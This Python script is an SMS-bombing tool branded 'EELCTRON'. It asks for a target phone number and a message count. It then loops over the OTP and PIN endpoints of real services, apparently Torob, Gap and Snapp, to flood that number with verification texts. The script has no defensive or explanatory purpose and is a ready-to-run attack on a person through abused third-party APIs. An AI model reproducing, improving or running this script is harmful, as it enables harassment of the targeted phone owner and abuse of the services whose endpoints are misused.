from pyfiglet import Figlet
import requests
import time
from colorama import Fore,init
import os
os.system("clear")
init()
address="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
Sa=Figlet(font="slant")
print(Sa.renderText("\nE E L C T R O N"))
number=input("\n"+Fore.GREEN+"["+Fore.WHITE+"+"+Fore.GREEN+"]"+Fore.WHITE+" Enter Phone Number ---> ")
time.sleep(1)
count=input("\n"+Fore.GREEN+"["+Fore.WHITE+"+"+Fore.GREEN+"]"+Fore.WHITE+" Enter Count Of Sms Sent ---> ")
time.sleep(1)
data ={"cellphone": number}
count=int(count)
print("\n"+Fore.GREEN+"1."+" Torob Server")
print("\n"+Fore.GREEN+"2."+" Gap Server")
print("\n"+Fore.GREEN+"3."+" Snap Server")
sht=input("\n"+Fore.GREEN+"["+Fore.WHITE+"+"+Fore.GREEN+"]"+Fore.WHITE+" Choose Operation ---> ")
os.system("clear")
Sa=Figlet(font="slant")
print(Sa.renderText("\nS T A R T"))
if sht=="1":
    for bomb in range(0, count):
        m=requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + number)
        time.sleep(3)
        print(Fore.GREEN+"["+Fore.WHITE+"+"+Fore.GREEN+"]"+Fore.WHITE+" Sent Message (Server Torob)")
        print("---------------------------")
elif sht=="2":
    for bomb in range(0, count):
        m=requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + number)
        n=requests.get("https://core.gap.im/v1/user/add.json?mobile=" + number)
        time.sleep(3)
        print(Fore.GREEN+"["+Fore.WHITE+"+"+Fore.GREEN+"]"+Fore.WHITE+" Sent Message (Server Gap)")
        print("---------------------------")
elif sht=="3":
    for bomb in range(0, count):
        m=requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + number)
        time.sleep(3)
        n=requests.get("https://core.gap.im/v1/user/add.json?mobile=" + number)
        f=requests.post(address, data)
        print(Fore.GREEN+"["+Fore.WHITE+"+"+Fore.GREEN+"]"+Fore.WHITE+" Sent Message (Server Snap)")
        print("---------------------------")
else:
    time.sleep(2)
    print(Fore.RED+"["+Fore.WHITE+"-"+Fore.RED+"]"+Fore.WHITE+" Sometinks Wrong!")